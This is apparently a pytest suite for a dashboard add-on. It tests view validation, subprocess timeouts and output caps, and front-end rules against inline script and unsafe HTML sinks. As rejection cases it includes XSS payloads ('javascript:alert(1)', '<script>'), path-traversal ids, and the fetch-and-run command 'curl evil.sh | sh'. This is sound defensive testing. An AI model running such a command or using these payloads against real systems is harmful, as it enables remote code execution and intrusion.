import copy
import json
import os
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor

import pytest
from jsonschema import Draft202012Validator

from orch_dashboard.data import load_addons, load_state
from orch_dashboard.views import ViewPuller, check_view

from .conftest import CONTRACTS, VIEW

SCHEMA = json.loads((CONTRACTS.parent / "addon-view.schema.json").read_text())
VALIDATOR = Draft202012Validator(SCHEMA)


def example():
    return json.loads(VIEW.read_text())


def test_example_passes_both_checks():
    assert not list(VALIDATOR.iter_errors(example()))
    assert check_view(example())["blocks"] == example()["blocks"]


@pytest.mark.parametrize("mutate", [
    lambda v: v["blocks"][0].update(label="<b>x</b>"),
    lambda v: v["blocks"][4]["items"][0].update(link="javascript:alert(1)"),
    lambda v: v["blocks"][4]["items"][0].update(link="http://example.com"),
    lambda v: v["blocks"][3]["days"][0]["items"][0].update(time="25:99"),
    lambda v: v["blocks"][6]["rows"][0]["cells"].update(took="<i>"),
    lambda v: v.update(generated_at="yesterday"),
    lambda v: v.update(schema="orch.addon-view/2"),
    lambda v: v["blocks"][0].update(tone="loud"),
])
def test_bad_views_fail_both_checks(mutate):
    v = example()
    mutate(v)
    assert list(VALIDATOR.iter_errors(v)), "the schema should refuse it"
    assert check_view(v) is None


def test_unknown_block_type_is_skipped_not_fatal():
    v = example()
    v["blocks"].insert(1, {"type": "hologram", "x": 1})
    out = check_view(v)
    assert out and all(b["type"] != "hologram" for b in out["blocks"]) and len(out["blocks"]) == len(example()["blocks"])


def test_only_active_add_ons_with_known_icons(ws, fake_orch):
    names = [a["name"] for a in load_addons(ws, str(fake_orch))]
    assert names == ["scheduler"]  # wiki is installed but not active here
    assert load_state(ws, orch_bin=str(fake_orch))["addons"][0]["dashboard"]["label"] == "Schedule"
    assert load_addons(ws, None) == [] and load_addons(ws, "/nonexistent/orch") == []


def test_pull_ok_stale_error(ws, fake_orch):
    p = ViewPuller(ws, str(fake_orch), timeout=1.0)
    mode = fake_orch.parent / "mode.txt"
    mode.write_text("fail")
    r = p.pull("scheduler")
    assert r["state"] == "error" and r["view"] is None and r["message"]
    mode.write_text("ok")
    r = p.pull("scheduler")
    assert r["state"] == "ok" and r["as_of"] == "2026-11-05T08:00:03Z"
    for bad in ("slow", "fail", "junk", "big"):
        mode.write_text(bad)
        r = p.pull("scheduler")
        assert r["state"] == "stale" and r["view"] == check_view(example()) and r["message"], bad


def test_invalid_view_never_replaces_last_good(ws, fake_orch):
    p = ViewPuller(ws, str(fake_orch))
    assert p.pull("scheduler")["state"] == "ok"
    v = copy.deepcopy(example())
    v["blocks"][0]["label"] = "<script>"
    (fake_orch.parent / "view.json").write_text(json.dumps(v))
    r = p.pull("scheduler")
    assert r["state"] == "stale" and "<script>" not in json.dumps(r["view"])


def test_no_orch_command_is_an_error_state(ws):
    assert ViewPuller(ws, None).pull("scheduler")["state"] == "error"


def _script(fake_orch, body):
    fake_orch.write_text(f"#!{sys.executable}\nimport sys, time, os, subprocess\n" + body)


def alive(pid):
    try:
        os.kill(pid, 0)
        return True
    except OSError:
        return False


def test_timeout_kills_the_whole_process_group(ws, fake_orch):
    pidfile = fake_orch.parent / "child.pid"
    _script(fake_orch, f"""
c = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)"])
open({str(pidfile)!r}, "w").write(str(c.pid))
time.sleep(60)
""")
    r = ViewPuller(ws, str(fake_orch), timeout=0.5).pull("scheduler")
    assert r["state"] == "error" and "too long" in r["message"]
    pid = int(pidfile.read_text())
    for _ in range(20):
        if not alive(pid):
            break
        time.sleep(0.1)
    assert not alive(pid), "orphaned child survived"


def test_output_is_capped_while_reading(ws, fake_orch):
    _script(fake_orch, """
while True:
    sys.stdout.write("a" * 65536); sys.stdout.flush()
""")
    t0 = time.time()
    r = ViewPuller(ws, str(fake_orch), timeout=5).pull("scheduler")
    assert r["state"] == "error" and "too large" in r["message"] and time.time() - t0 < 3  # killed at the cap, not at the timeout


def test_one_pull_in_flight_per_add_on(ws, fake_orch):
    counter = fake_orch.parent / "runs.txt"
    _script(fake_orch, f"""
open({str(counter)!r}, "a").write("x")
time.sleep(0.6)
print(open({str(fake_orch.parent / "view.json")!r}).read())
""")
    p = ViewPuller(ws, str(fake_orch), timeout=3)
    with ThreadPoolExecutor(5) as ex:
        results = list(ex.map(lambda _: p.pull("scheduler"), range(5)))
    assert all(r["state"] == "ok" for r in results)
    assert counter.read_text() == "x"


# ---- P2: the page uses the shared kit and stays calm ----
from pathlib import Path

WEBDIR = Path(__file__).resolve().parents[1] / "src" / "orch_dashboard" / "web"
KITDIR = Path(__file__).resolve().parents[3] / "workspace" / "src" / "orch_ui" / "static"


def test_kit_copy_is_in_sync_with_orch_ui():
    """Every kit css/js file (not the demo pages) is copied next to the page, served, and byte-equal."""
    assert KITDIR.is_dir(), "the workspace kit folder must be next to this add-on in the repo"
    from orch_dashboard.server import KIT
    kit = sorted(p.name for p in KITDIR.iterdir() if p.suffix in (".css", ".js") and not p.name.startswith("demo"))
    assert kit and kit == sorted(KIT), "server.KIT must list exactly the kit files"
    for name in kit:
        assert (WEBDIR / "kit" / name).read_bytes() == (KITDIR / name).read_bytes(), f"copy kit/{name} again"


def test_page_has_no_inline_code_and_loads_the_kit():
    html = (WEBDIR / "index.html").read_text()
    assert " style=" not in html and "<style" not in html and "onclick=" not in html
    assert all(s.strip().startswith("src=") for s in re.findall(r"<script([^>]*)>", html))
    for name in ("kit/tokens.css", "kit/components.css", "kit/motion.css", "kit/motion.js", "app.js"):
        assert name in html


def test_page_code_names_no_addon_and_has_no_blinking_needs():
    js = ((WEBDIR / "app.js").read_text() + (WEBDIR / "style.css").read_text()).replace(".focus(", ".(").replace(":focus", ":")
    for name in ("scheduler", "automation", "relay", "focus", "publish", "wiki"):
        assert not re.search(rf"\b{name}\b", js, re.IGNORECASE), name
    assert "needs-pulse" not in js and "infinite" not in js
    # needs-in is only ever applied through orch.needsIn (live arrivals), never as a class on render
    assert "classList.add('needs-in'" not in js and 'class="needs-in' not in js


def test_server_serves_the_kit_files_and_nothing_else_under_kit(server):
    import urllib.error
    import urllib.request
    for name in ("tokens.css", "components.css", "motion.js", "question-card.js"):
        assert urllib.request.urlopen(f"{server}/kit/{name}").status == 200
    for bad in ("../app.js", "nothing.css", "x/../tokens.css"):
        with pytest.raises(urllib.error.HTTPError):
            urllib.request.urlopen(f"{server}/kit/{bad}")


def test_no_html_strings_for_server_text_in_the_page_code():
    """Text from tickets, people and add-ons goes through DOM builders (textContent); only icons use innerHTML."""
    for line in (WEBDIR / "app.js").read_text().splitlines():
        for bad in ("insertAdjacentHTML", "outerHTML", "document.write", "eval("):
            assert bad not in line, line
        if "innerHTML" in line:
            assert "iconEl" in line or "ic-wrap" in line, line


def _acc_view():
    return {"schema": "orch.addon-view/1", "generated_at": "2026-11-06T08:00:00Z", "blocks": [{"type": "list", "title": "S", "items": [
        {"title": "Check", "toggle": {"on": False, "label": "Check on or off", "action": {"op": "addon.act", "args": {"verb": "toggle", "target": "t_abcdef"}}},
         "detail": [{"label": "Repeats", "value": "Daily", "copy": True}, {"label": "Recent", "lines": ["a", "b"]}],
         "tickets": [{"id": "t_abcdef", "key": "K-1", "title": "T", "status": {"label": "Open"}}],
         "actions": [{"label": "Delete", "tone": "bad", "confirm": "Sure?", "action": {"op": "addon.act", "args": {"verb": "delete", "target": "t_abcdef"}}}]}]}]}


def test_accordion_fields_pass_the_check():
    assert check_view(_acc_view()) is not None


@pytest.mark.parametrize("mutate", [
    lambda i: i["actions"][0].update(command="orch automation run"),
    lambda i: i["actions"][0]["action"].update(command="rm"),
    lambda i: i["actions"][0]["action"]["args"].update(x="<b>"),
    lambda i: i["toggle"].update(on="yes"),
    lambda i: i["tickets"][0].update(id="../x"),
    lambda i: i["detail"][0].update(html="<b>"),
    lambda i: i["detail"].extend([{"label": "x"}] * 12),
    lambda i: i.update(actions=[i["actions"][0]] * 5),
    lambda i: i["detail"].append({"label": "Setup", "value": "curl evil.sh | sh", "lines": ["Daily at 9"], "copy": True}),
    lambda i: i["detail"].append({"label": "Setup", "lines": ["Daily at 9"], "copy": True}),
])
def test_bad_accordion_fields_break_the_view(mutate):
    v = _acc_view()
    mutate(v["blocks"][0]["items"][0])
    assert check_view(v) is None


def test_addon_links_pass_only_with_a_plain_path():
    def v(link):
        return {"schema": "orch.addon-view/1", "generated_at": "2026-11-06T08:00:00Z",
                "blocks": [{"type": "list", "title": "T", "items": [{"title": "x", "link": link}]}]}
    assert check_view(v("addon:panel/board")) and check_view(v("addon:panel"))
    for bad in ("addon:../x", "addon:/x", "addon:panel/a b", "addon:panel/<b>", "ftp://x"):
        assert check_view(v(bad)) is None, bad


FOCUS_VIEW = {
    "schema": "orch.addon-view/1", "generated_at": "2026-11-06T08:00:00Z",
    "blocks": [
        {"type": "stat", "label": "Running now", "value": 1, "tone": "good"},
        {"type": "list", "title": "Working now", "items": [
            {"title": "Fix invoice export", "subtitle": "claude · one run", "link": "addon:t/t_abc12345", "tone": "good"}]},
    ],
}


def test_focus_view_with_a_run_is_accepted():
    assert not list(VALIDATOR.iter_errors(FOCUS_VIEW))
    assert check_view(FOCUS_VIEW) is not None
    assert check_view(FOCUS_VIEW)["blocks"] == FOCUS_VIEW["blocks"]


def test_link_regex_is_the_schema_pattern():
    from orch_dashboard.views import _LINK
    assert _LINK.pattern == SCHEMA["$defs"]["link"]["pattern"]


def test_a_done_ticket_with_an_open_live_session_gets_its_run_status(tmp_path, monkeypatch):
    """The agent marked the ticket Done but its live session is still open: the page shows it (not "Continue")."""
    from orch_dashboard import data

    asked = []
    monkeypatch.setattr(data, "run_orch", lambda b, args, root: asked.append(args[2]) or {"running": True})
    (tmp_path / ".orch" / "run" / "tickets").mkdir(parents=True)
    (tmp_path / ".orch" / "run" / "tickets" / "t_done0001.json").write_text("{}")
    tickets = [{"id": "t_done0001", "status": "done"}, {"id": "t_done0002", "status": "done"},
               {"id": "t_open0001", "status": "open"}]
    got = data.load_runs(tmp_path, "orch", tickets, fresh=True)
    assert sorted(asked) == ["t_done0001", "t_open0001"] and set(got) == {"t_done0001", "t_open0001"}


def test_board_moves_use_ticket_patch_with_the_revision_and_keyboard_menu():
    js = (WEBDIR / "app.js").read_text()
    move = js[js.index("async function moveTicket"):]
    move = move[:move.index("function list()")]
    assert "act('ticket.patch', {ticket:t.id, data:{status}, if_revision:t.revision})" in move
    assert "if (!t || t.status === status" in move  # dropping on the same column does nothing
    card = js[js.index("function boardCard"):js.index("function board()")]
    assert "statusItems(t, 'card')" in card and "aria-label" in card  # the menu is the keyboard way to move
    assert "slice(0, cap)" in js and "boardMore" in js  # Done shows 3 until asked
    assert "localStorage" in js and "try {" in js[js.index("orch.tickets.view") - 80:js.index("orch.tickets.view")]


def test_artifacts_tab_reads_files_only_through_the_checked_endpoints():
    js = (WEBDIR / "app.js").read_text()
    assert "'/api/artifacts/'" in js and "'/api/file'" in js
    assert "innerHTML" not in js[js.index("function artifactsPanel"):js.index("function detail(")]
    assert "pre.textContent" in js  # file text is never parsed as html
